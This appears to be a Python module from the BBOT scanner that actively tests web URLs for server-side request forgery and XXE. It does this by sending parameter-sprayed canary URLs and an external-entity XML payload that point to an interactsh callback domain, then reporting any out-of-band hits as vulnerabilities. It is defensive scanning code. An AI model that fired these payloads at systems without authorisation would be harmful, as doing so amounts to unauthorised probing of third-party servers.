from bbot.errors import InteractshError
from bbot.modules.base import BaseModule


ssrf_params = [
    "Dest",
    "Redirect",
    "URI",
    "Path",
    "Continue",
    "URL",
    "Window",
    "Next",
    "Data",
    "Reference",
    "Site",
    "HTML",
    "Val",
    "Validate",
    "Domain",
    "Callback",
    "Return",
    "Page",
    "Feed",
    "Host",
    "Port",
    "To",
    "Out",
    "View",
    "Dir",
    "Show",
    "Navigation",
    "Open",
]


class BaseSubmodule:
    technique_description = "base technique description"
    severity = "INFO"
    paths = None

    def __init__(self, parent_module):
        self.parent_module = parent_module
        self.test_paths = self.create_paths()

    def set_base_url(self, event):
        return f"{event.parsed_url.scheme}://{event.parsed_url.netloc}"

    def create_paths(self):
        return self.paths

    async def test(self, event):
        base_url = self.set_base_url(event)

        for test_path in self.test_paths:
            subdomain_tag = self.parent_module.helpers.rand_string(4)
            test_path_prepared = test_path.replace(
                "SSRF_CANARY", f"{subdomain_tag}.{self.parent_module.interactsh_domain}"
            )
            test_url = f"{base_url}{test_path_prepared}"
            self.parent_module.debug(f"Sending request to URL: {test_url}")
            r = await self.parent_module.helpers.curl(url=test_url)
            if r:
                self.process(event, r, subdomain_tag)

    def process(self, event, r, subdomain_tag):
        response_token = self.parent_module.interactsh_domain.split(".")[0][::-1]
        if response_token in r:
            read_response = True
        else:
            read_response = False

        self.parent_module.interactsh_subdomain_tags[subdomain_tag] = (
            event,
            self.technique_description,
            self.severity,
            read_response,
        )


class Generic_SSRF(BaseSubmodule):
    technique_description = "Generic SSRF (GET)"
    severity = "HIGH"

    def set_base_url(self, event):
        return event.data

    def create_paths(self):
        query_string = ""
        for param in ssrf_params:
            query_string += f"{param}=http://SSRF_CANARY&"

        query_string_lower = ""
        for param in ssrf_params:
            query_string_lower += f"{param.lower()}=http://SSRF_CANARY&"

        return [f"?{query_string.rstrip('&')}", f"?{query_string_lower.rstrip('&')}"]


class Generic_SSRF_POST(BaseSubmodule):
    technique_description = "Generic SSRF (POST)"
    severity = "HIGH"

    def set_base_url(self, event):
        return event.data

    async def test(self, event):
        test_url = f"{event.data}"

        subdomain_tag = self.parent_module.helpers.rand_string(4, digits=False)
        post_data = {}
        for param in ssrf_params:
            post_data[param] = f"http://{subdomain_tag}.{self.parent_module.interactsh_domain}"

        subdomain_tag_lower = self.parent_module.helpers.rand_string(4, digits=False)
        post_data_lower = {
            k.lower(): f"http://{subdomain_tag_lower}.{self.parent_module.interactsh_domain}"
            for k, v in post_data.items()
        }

        post_data_list = [(subdomain_tag, post_data), (subdomain_tag_lower, post_data_lower)]

        for tag, pd in post_data_list:
            r = await self.parent_module.helpers.curl(url=test_url, method="POST", post_data=pd)
            self.process(event, r, tag)


class Generic_XXE(BaseSubmodule):
    technique_description = "Generic XXE"
    severity = "HIGH"
    paths = None

    async def test(self, event):
        rand_entity = self.parent_module.helpers.rand_string(4, digits=False)
        subdomain_tag = self.parent_module.helpers.rand_string(4, digits=False)

        post_body = f"""<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY {rand_entity} SYSTEM "http://{subdomain_tag}.{self.parent_module.interactsh_domain}" >
]>
<foo>&{rand_entity};</foo>"""
        test_url = event.parsed_url.geturl()
        r = await self.parent_module.helpers.curl(
            url=test_url, method="POST", raw_body=post_body, headers={"Content-type": "application/xml"}
        )
        if r:
            self.process(event, r, subdomain_tag)


class generic_ssrf(BaseModule):
    watched_events = ["URL"]
    produced_events = ["VULNERABILITY"]
    flags = ["active", "aggressive", "web-thorough"]
    meta = {"description": "Check for generic SSRFs", "created_date": "2022-07-30", "author": "@liquidsec"}
    in_scope_only = True

    deps_apt = ["curl"]

    async def setup(self):
        self.submodules = {}
        self.interactsh_subdomain_tags = {}
        self.severity = None
        self.generic_only = self.config.get("generic_only", False)

        if self.scan.config.get("interactsh_disable", False) == False:
            try:
                self.interactsh_instance = self.helpers.interactsh()
                self.interactsh_domain = await self.interactsh_instance.register(callback=self.interactsh_callback)
            except InteractshError as e:
                self.warning(f"Interactsh failure: {e}")
                return False
        else:
            self.warning(
                "The generic_ssrf module is completely dependent on interactsh to function, but it is disabled globally. Aborting."
            )
            return None

        # instantiate submodules
        for m in BaseSubmodule.__subclasses__():
            if m.__name__.startswith("Generic_"):
                self.verbose(f"Starting generic_ssrf submodule: {m.__name__}")
                self.submodules[m.__name__] = m(self)

        return True

    async def handle_event(self, event):
        for s in self.submodules.values():
            await s.test(event)

    async def interactsh_callback(self, r):
        full_id = r.get("full-id", None)
        if full_id:
            if "." in full_id:
                match = self.interactsh_subdomain_tags.get(full_id.split(".")[0])
                if not match:
                    return
                matched_event = match[0]
                matched_technique = match[1]
                matched_severity = match[2]
                matched_read_response = str(match[3])

                await self.emit_event(
                    {
                        "severity": matched_severity,
                        "host": str(matched_event.host),
                        "url": matched_event.data,
                        "description": f"Out-of-band interaction: [{matched_technique}] [{r.get('protocol').upper()}] Read Response: {matched_read_response}",
                    },
                    "VULNERABILITY",
                    matched_event,
                    context=f"{{module}} scanned {matched_event.data} and detected {{event.type}}: {matched_technique}",
                )
            else:
                # this is likely caused by something trying to resolve the base domain first and can be ignored
                self.debug("skipping result because subdomain tag was missing")

    async def cleanup(self):
        if self.scan.config.get("interactsh_disable", False) == False:
            try:
                await self.interactsh_instance.deregister()
                self.debug(
                    f"successfully deregistered interactsh session with correlation_id {self.interactsh_instance.correlation_id}"
                )
            except InteractshError as e:
                self.warning(f"Interactsh failure: {e}")

    async def finish(self):
        if self.scan.config.get("interactsh_disable", False) == False:
            await self.helpers.sleep(5)
            try:
                for r in await self.interactsh_instance.poll():
                    await self.interactsh_callback(r)
            except InteractshError as e:
                self.debug(f"Error in interact.sh: {e}")
